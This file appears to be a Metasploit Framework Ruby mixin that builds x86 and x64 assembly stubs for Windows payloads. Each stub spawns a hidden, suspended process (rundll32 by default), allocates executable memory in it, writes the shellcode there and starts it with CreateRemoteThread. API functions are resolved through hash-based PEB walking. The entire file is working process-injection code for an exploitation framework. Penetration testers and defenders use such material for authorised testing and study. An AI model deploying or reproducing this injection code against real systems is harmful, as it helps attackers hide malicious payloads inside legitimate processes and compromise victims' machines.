require 'msf/core'

###
#
# This mixin provides support for generating PrependMigrate blocks for Windows payloads
#
###
module Msf::Payload::Windows::PrependMigrate

	#
	# Initialize
	#
	def initialize(info = {})
		ret = super( info )

		register_advanced_options(
			[
				Msf::OptBool.new('PrependMigrate', [ true, "Spawns and runs shellcode in new process", false ]),
				Msf::OptString.new('PrependMigrateProc', [ false, "Process to spawn and run shellcode in" ])
			], Msf::Payload::Windows )
		ret
	end

	#
	# Returns the state of the PrependMigrate option
	# See https://github.com/rapid7/metasploit-framework/pull/917
	# for discussion.
	#
	def prepend_migrate?
		!!(datastore['PrependMigrate'] && datastore['PrependMigrate'].to_s.downcase == 'true')
	end

	#
	# Overload the generate() call to prefix our stubs
	#
	def prepends(buf)
		pre = ''

		test_arch = [ *(self.arch) ]

		if prepend_migrate?
			# Handle all x86 code here
			if test_arch.include?(ARCH_X86)
				migrate_asm = prepend_migrate(buf)
				pre << Metasm::Shellcode.assemble(Metasm::Ia32.new, migrate_asm).encode_string
			# Handle all x64 code here
			elsif test_arch.include?(ARCH_X86_64) or test_arch.include?(ARCH_X64)
				migrate_asm = prepend_migrate_64(buf)
				pre << Metasm::Shellcode.assemble(Metasm::X64.new, migrate_asm).encode_string
			end
		end
		return pre + buf
	end

	#
	# Create assembly
	#
	def prepend_migrate(buf)
		payloadsize = "0x%04x" % buf.length
		procname = datastore['PrependMigrateProc'] || 'rundll32'

		# Prepare instructions to get address of block_api into ebp
		block_api_start = <<-EOS
			call start
		EOS
		block_api_asm = <<-EOS
		api_call:
			pushad                    ; We preserve all the registers for the caller, bar EAX and ECX.
			mov ebp, esp              ; Create a new stack frame
			xor edx, edx              ; Zero EDX
			mov edx, [fs:edx+48]      ; Get a pointer to the PEB
			mov edx, [edx+12]         ; Get PEB->Ldr
			mov edx, [edx+20]         ; Get the first module from the InMemoryOrder module list
		next_mod:                   ;
			mov esi, [edx+40]         ; Get pointer to modules name (unicode string)
			movzx ecx, word [edx+38]  ; Set ECX to the length we want to check
			xor edi, edi              ; Clear EDI which will store the hash of the module name
		loop_modname:               ;
			xor eax, eax              ; Clear EAX
			lodsb                     ; Read in the next byte of the name
			cmp al, 'a'               ; Some versions of Windows use lower case module names
			jl not_lowercase          ;
			sub al, 0x20              ; If so normalise to uppercase
		not_lowercase:              ;
			ror edi, 13               ; Rotate right our hash value
			add edi, eax              ; Add the next byte of the name
			loop loop_modname         ; Loop untill we have read enough
			; We now have the module hash computed
			push edx                  ; Save the current position in the module list for later
			push edi                  ; Save the current module hash for later
			; Proceed to iterate the export address table
			mov edx, [edx+16]         ; Get this modules base address
			mov eax, [edx+60]         ; Get PE header
			add eax, edx              ; Add the modules base address
			mov eax, [eax+120]        ; Get export tables RVA
			test eax, eax             ; Test if no export address table is present
			jz get_next_mod1          ; If no EAT present, process the next module
			add eax, edx              ; Add the modules base address
			push eax                  ; Save the current modules EAT
			mov ecx, [eax+24]         ; Get the number of function names
			mov ebx, [eax+32]         ; Get the rva of the function names
			add ebx, edx              ; Add the modules base address
			; Computing the module hash + function hash
		get_next_func:              ;
			jecxz get_next_mod        ; When we reach the start of the EAT (we search backwards), process the next module
			dec ecx                   ; Decrement the function name counter
			mov esi, [ebx+ecx*4]      ; Get rva of next module name
			add esi, edx              ; Add the modules base address
			xor edi, edi              ; Clear EDI which will store the hash of the function name
			; And compare it to the one we want
		loop_funcname:              ;
			xor eax, eax              ; Clear EAX
			lodsb                     ; Read in the next byte of the ASCII function name
			ror edi, 13               ; Rotate right our hash value
			add edi, eax              ; Add the next byte of the name
			cmp al, ah                ; Compare AL (the next byte from the name) to AH (null)
			jne loop_funcname         ; If we have not reached the null terminator, continue
			add edi, [ebp-8]          ; Add the current module hash to the function hash
			cmp edi, [ebp+36]         ; Compare the hash to the one we are searchnig for
			jnz get_next_func         ; Go compute the next function hash if we have not found it
			; If found, fix up stack, call the function and then value else compute the next one...
			pop eax                   ; Restore the current modules EAT
			mov ebx, [eax+36]         ; Get the ordinal table rva
			add ebx, edx              ; Add the modules base address
			mov cx, [ebx+2*ecx]       ; Get the desired functions ordinal
			mov ebx, [eax+28]         ; Get the function addresses table rva
			add ebx, edx              ; Add the modules base address
			mov eax, [ebx+4*ecx]      ; Get the desired functions RVA
			add eax, edx              ; Add the modules base address to get the functions actual VA
			; We now fix up the stack and perform the call to the desired function...
		finish:
			mov [esp+36], eax         ; Overwrite the old EAX value with the desired api address for the upcoming popad
			pop ebx                   ; Clear off the current modules hash
			pop ebx                   ; Clear off the current position in the module list
			popad                     ; Restore all of the callers registers, bar EAX, ECX and EDX which are clobbered
			pop ecx                   ; Pop off the origional return address our caller will have pushed
			pop edx                   ; Pop off the hash value our caller will have pushed
			push ecx                  ; Push back the correct return value
			jmp eax                   ; Jump into the required function
			; We now automagically return to the correct caller...
		get_next_mod:               ;
			pop eax                   ; Pop off the current (now the previous) modules EAT
		get_next_mod1:              ;
			pop edi                   ; Pop off the current (now the previous) modules hash
			pop edx                   ; Restore our position in the module list
			mov edx, [edx]            ; Get the next module
			jmp.i8 next_mod           ; Process this module
		;--------------------------------------------------------------------------------------
		EOS

		# Prepare default exit block (sleep for a long long time)
		exitblock = <<-EOS
			;sleep
			push -1
			push 0xE035F044           ; hash( "kernel32.dll", "Sleep" )
			call ebp                  ; Sleep( ... );
		EOS

		# Check to see if we can find exitfunc in the payload
		exitfunc_index = buf.index("\x68\xA6\x95\xBD\x9D\xFF\xD5\x3C\x06\x7C\x0A" +
						"\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x53\xFF\xD5")
		if exitfunc_index
			exitblock_offset = "0x%04x + payload - exitblock" % (exitfunc_index - 5)
			exitblock = "exitblock:\njmp $+#{exitblock_offset}"
		end

		block_api_ebp_asm = <<-EOS
			pop ebp                   ; Pop off the address of 'api_call' for calling later.
		EOS
		block_close_to_payload = ''

		# Check if we can find block_api in the payload
		block_api = Metasm::Shellcode.assemble(Metasm::Ia32.new, block_api_asm).encode_string
		block_api_index = buf.index(block_api)
		if block_api_index

			# Prepare instructions to calculate address
			ebp_offset = "0x%04x" % (block_api_index + 5)
			block_api_ebp_asm = <<-EOS
				jmp close_to_payload
			return_from_close_to_payload:
				pop ebp
				add ebp, #{ebp_offset}
			EOS
			# Clear now-unneeded instructions
			block_api_asm = ''
			block_api_start = ''
			block_close_to_payload = <<-EOS
			close_to_payload:
				call return_from_close_to_payload
			EOS
		end

		#put all pieces together
		migrate_asm = <<-EOS
			cld                       ; Clear the direction flag.
			#{block_api_start}
			#{block_api_asm}
		start:
			#{block_api_ebp_asm}
			; get our own startupinfo at esp+0x60
			add esp,-400              ; adjust the stack to avoid corruption
			lea edx,[esp+0x60]
			push edx
			push 0xB16B4AB1           ; hash( "kernel32.dll", "GetStartupInfoA" )
			call ebp                  ; GetStartupInfoA( &si );

			lea eax,[esp+0x60]        ; Put startupinfo pointer back in eax

			jmp getcommand
			gotcommand:
			pop esi                   ; esi = address of process name (command line)

			; create the process
			lea edi,[eax+0x60]        ; Offset of empty space for lpProcessInformation
			push edi                  ; lpProcessInformation : write processinfo here
			push eax                  ; lpStartupInfo : current info (read)
			xor ebx,ebx
			push ebx                  ; lpCurrentDirectory
			push ebx                  ; lpEnvironment
			push 0x08000004           ; dwCreationFlags CREATE_NO_WINDOW | CREATE_SUSPENDED
			push ebx                  ; bInHeritHandles
			push ebx                  ; lpThreadAttributes
			push ebx                  ; lpProcessAttributes
			push esi                  ; lpCommandLine
			push ebx                  ; lpApplicationName

			push 0x863FCC79           ; hash( "kernel32.dll", "CreateProcessA" )
			call ebp                  ; CreateProcessA( &si );

			; if we didn't get a new process, use this one
			test eax,eax
			jz payload                ; If process creation failed, jump to shellcode

		goodProcess:
			; allocate memory in the process (VirtualAllocEx())
			; get handle
			push 0x40                 ; RWX
			add bh,0x10               ; ebx = 0x1000
			push ebx                  ; MEM_COMMIT
			push ebx                  ; size
			xor ebx,ebx
			push ebx                  ; address
			push [edi]                ; handle
			push 0x3F9287AE           ; hash( "kernel32.dll", "VirtualAllocEx" )
			call ebp                  ; VirtualAllocEx( ...);

			; eax now contains the destination
			; WriteProcessMemory()
			push esp                  ; lpNumberOfBytesWritten
			push #{payloadsize}       ; nSize
			; pick up pointer to shellcode & keep it on stack
			jmp begin_of_payload
			begin_of_payload_return:  ; lpBuffer
			push eax                  ; lpBaseAddress
			push [edi]                ; hProcess
			push 0xE7BDD8C5           ; hash( "kernel32.dll", "WriteProcessMemory" )
			call ebp                  ; WriteProcessMemory( ...)

			; run the code (CreateRemoteThread())
			push ebx                  ; lpthreadID
			push ebx                  ; run immediately
			push ebx                  ; no parameter
			mov ecx,[esp-0x4]
			push ecx                  ; shellcode
			push ebx                  ; stacksize
			push ebx                  ; lpThreadAttributes
			push [edi]
			push 0x799AACC6           ; hash( "kernel32.dll", "CreateRemoteThread" )
			call ebp                  ; CreateRemoteThread( ...);

			#{exitblock}              ; jmp to exitfunc or long sleep

		getcommand:
			call gotcommand
			db "#{procname}"
			db 0x00
		#{block_close_to_payload}
		begin_of_payload:
			call begin_of_payload_return
		payload:
		EOS
		migrate_asm
	end


	def prepend_migrate_64(buf)
		payloadsize = "0x%04x" % buf.length
		procname = datastore['PrependMigrateProc'] || 'rundll32'

		# Prepare instructions to get address of block_api into ebp
		block_api_start = <<-EOS
			call start
		EOS
		block_api_asm = <<-EOS
		api_call:
			push r9                  ; Save the 4th parameter
			push r8                  ; Save the 3rd parameter
			push rdx                 ; Save the 2nd parameter
			push rcx                 ; Save the 1st parameter
			push rsi                 ; Save RSI
			xor rdx, rdx             ; Zero rdx
			mov rdx, [gs:rdx+96]     ; Get a pointer to the PEB
			mov rdx, [rdx+24]        ; Get PEB->Ldr
			mov rdx, [rdx+32]        ; Get the first module from the InMemoryOrder module list
		next_mod:                  ;
			mov rsi, [rdx+80]        ; Get pointer to modules name (unicode string)
			movzx rcx, word [rdx+74] ; Set rcx to the length we want to check
			xor r9, r9               ; Clear r9 which will store the hash of the module name
		loop_modname:              ;
			xor rax, rax             ; Clear rax
			lodsb                    ; Read in the next byte of the name
			cmp al, 'a'              ; Some versions of Windows use lower case module names
			jl not_lowercase         ;
			sub al, 0x20             ; If so normalise to uppercase
		not_lowercase:             ;
			ror r9d, 13              ; Rotate right our hash value
			add r9d, eax             ; Add the next byte of the name
			loop loop_modname        ; Loop untill we have read enough
			; We now have the module hash computed
			push rdx                 ; Save the current position in the module list for later
			push r9                  ; Save the current module hash for later
			; Proceed to itterate the export address table
			mov rdx, [rdx+32]        ; Get this modules base address
			mov eax, dword [rdx+60]  ; Get PE header
			add rax, rdx             ; Add the modules base address
			mov eax, dword [rax+136] ; Get export tables RVA
			test rax, rax            ; Test if no export address table is present
			jz get_next_mod1         ; If no EAT present, process the next module
			add rax, rdx             ; Add the modules base address
			push rax                 ; Save the current modules EAT
			mov ecx, dword [rax+24]  ; Get the number of function names
			mov r8d, dword [rax+32]  ; Get the rva of the function names
			add r8, rdx              ; Add the modules base address
			; Computing the module hash + function hash
		get_next_func:             ;
			jecxz get_next_mod       ; When we reach the start of the EAT (we search backwards), process the next module
			dec rcx                  ; Decrement the function name counter
			mov esi, dword [r8+rcx*4]; Get rva of next module name
			add rsi, rdx             ; Add the modules base address
			xor r9, r9               ; Clear r9 which will store the hash of the function name
			; And compare it to the one we want
		loop_funcname:             ;
			xor rax, rax             ; Clear rax
			lodsb                    ; Read in the next byte of the ASCII function name
			ror r9d, 13              ; Rotate right our hash value
			add r9d, eax             ; Add the next byte of the name
			cmp al, ah               ; Compare AL (the next byte from the name) to AH (null)
			jne loop_funcname        ; If we have not reached the null terminator, continue
			add r9, [rsp+8]          ; Add the current module hash to the function hash
			cmp r9d, r10d            ; Compare the hash to the one we are searchnig for
			jnz get_next_func        ; Go compute the next function hash if we have not found it
			; If found, fix up stack, call the function and then value else compute the next one...
			pop rax                  ; Restore the current modules EAT
			mov r8d, dword [rax+36]  ; Get the ordinal table rva
			add r8, rdx              ; Add the modules base address
			mov cx, [r8+2*rcx]       ; Get the desired functions ordinal
			mov r8d, dword [rax+28]  ; Get the function addresses table rva
			add r8, rdx              ; Add the modules base address
			mov eax, dword [r8+4*rcx]; Get the desired functions RVA
			add rax, rdx             ; Add the modules base address to get the functions actual VA
			; We now fix up the stack and perform the call to the drsired function...
		finish:
			pop r8                   ; Clear off the current modules hash
			pop r8                   ; Clear off the current position in the module list
			pop rsi                  ; Restore RSI
			pop rcx                  ; Restore the 1st parameter
			pop rdx                  ; Restore the 2nd parameter
			pop r8                   ; Restore the 3rd parameter
			pop r9                   ; Restore the 4th parameter
			pop r10                  ; pop off the return address
			sub rsp, 32              ; reserve space for the four register params (4 * sizeof(QWORD) = 32)
															 ; It is the callers responsibility to restore RSP if need be (or alloc more space or align RSP).
			push r10                 ; push back the return address
			jmp rax                  ; Jump into the required function
			; We now automagically return to the correct caller...
		get_next_mod:              ;
			pop rax                  ; Pop off the current (now the previous) modules EAT
		get_next_mod1:             ;
			pop r9                   ; Pop off the current (now the previous) modules hash
			pop rdx                  ; Restore our position in the module list
			mov rdx, [rdx]           ; Get the next module
			jmp next_mod             ; Process this module
		EOS

		# Prepare default exit block (sleep for a long long time)
		exitblock = <<-EOS
			;sleep
			xor rcx,rcx
			dec rcx                   ; rcx = -1
			mov r10d, 0xE035F044      ; hash( "kernel32.dll", "Sleep" )
			call rbp                  ; Sleep( ... );
		EOS

		# Check to see if we can find x64 exitfunc in the payload
		exitfunc_index = buf.index("\x41\xBA\xA6\x95\xBD\x9D\xFF\xD5\x48\x83\xC4\x28\x3C\x06" +
				"\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x59\x41\x89\xDA\xFF\xD5")
		if exitfunc_index
			exitblock_offset = "0x%04x + payload - exitblock" % (exitfunc_index - 5)
			exitblock = "exitblock:\njmp $+#{exitblock_offset}"
		end

		block_api_rbp_asm = <<-EOS
			pop rbp                   ; Pop off the address of 'api_call' for calling later.
		EOS
		block_close_to_payload = ''

		# Check if we can find block_api in the payload
		block_api = Metasm::Shellcode.assemble(Metasm::X64.new, block_api_asm).encode_string
		block_api_index = buf.index(block_api)
		if block_api_index

			# Prepare instructions to calculate address
			rbp_offset = "0x%04x" % (block_api_index + 5)
			block_api_rbp_asm = <<-EOS
				jmp close_to_payload
			return_from_close_to_payload:
				pop rbp
				add rbp, #{rbp_offset}
			EOS
			# Clear now-unneeded instructions
			block_api_asm = ''
			block_api_start = ''
			block_close_to_payload = <<-EOS
			close_to_payload:
				call return_from_close_to_payload
			EOS
		end

		#put all pieces together
		migrate_asm = <<-EOS
			cld                       ; Clear the direction flag.
			#{block_api_start}
			#{block_api_asm}
		start:
			#{block_api_rbp_asm}
			; get our own startupinfo at esp+0x60
			add rsp,-400              ; adjust the stack to avoid corruption
			lea rcx,[rsp+0x30]
			mov r10d, 0xB16B4AB1      ; hash( "kernel32.dll", "GetStartupInfoA" )
			call rbp                  ; GetStartupInfoA( &si );

			jmp getcommand
			gotcommand:
			pop rsi                   ; rsi = address of process name (command line)

			; create the process
			lea rdi,[rsp+0x110]       ; Offset of empty space for lpProcessInformation
			push rdi                  ; lpProcessInformation : write processinfo here
			lea rcx,[rsp+0x58]
			push rcx                  ; lpStartupInfo : current info (read)
			xor rcx,rcx
			push rcx                  ; lpCurrentDirectory
			push rcx                  ; lpEnvironment
			push 0x08000004           ; dwCreationFlags CREATE_NO_WINDOW | CREATE_SUSPENDED
			push rcx                  ; bInHeritHandles
			mov r9, rcx               ; lpThreadAttributes
			mov r8, rcx               ; lpProcessAttributes
			mov rdx, rsi              ; lpCommandLine
			; rcx is already zero     ; lpApplicationName
			mov r10d, 0x863FCC79      ; hash( "kernel32.dll", "CreateProcessA" )
			call rbp                  ; CreateProcessA( &si );

			; if we didn't get a new process, use this one
			test rax,rax
			jz payload                ; If process creation failed, jump to shellcode

		goodProcess:
			; allocate memory in the process (VirtualAllocEx())
			; get handle
			push 0x40                 ; RWX
			mov r9,0x1000             ; 0x1000 = MEM_COMMIT
			mov r8,r9                 ; size
			xor rdx,rdx               ; address
			mov rcx, [rdi]            ; handle
			mov r10d, 0x3F9287AE      ; hash( "kernel32.dll", "VirtualAllocEx" )
			call rbp                  ; VirtualAllocEx( ...);

			; eax now contains the destination - save in ebx
			mov rbx, rax              ; lpBaseAddress
			; WriteProcessMemory()
			push rsp                  ; lpNumberOfBytesWritten
			mov r9, #{payloadsize}    ; nSize
			; pick up pointer to shellcode & keep it on stack
			jmp begin_of_payload
			begin_of_payload_return:
			pop r8                    ; lpBuffer
			mov rdx, rax              ; lpBaseAddress
			mov rcx, [rdi]            ; hProcess
			mov r10d, 0xE7BDD8C5      ; hash( "kernel32.dll", "WriteProcessMemory" )
			call rbp                  ; WriteProcessMemory( ...);

			; run the code (CreateRemoteThread())
			xor rcx, rcx              ; rdx = 0
			push rcx                  ; lpthreadID
			push rcx                  ; run immediately
			push rcx                  ; no parameter
			mov r9,rbx                ; shellcode
			mov r8, rcx               ; stacksize
			;rdx already equals 0     ; lpThreadAttributes
			mov rcx, [rdi]
			mov r10d, 0x799AACC6      ; hash( "kernel32.dll", "CreateRemoteThread" )
			call rbp                  ; CreateRemoteThread( ...);

			#{exitblock}              ; jmp to exitfunc or long sleep

		getcommand:
			call gotcommand
			db "#{procname}"
			db 0x00
		#{block_close_to_payload}
		begin_of_payload:
			call begin_of_payload_return
		payload:
		EOS
		migrate_asm
	end

end

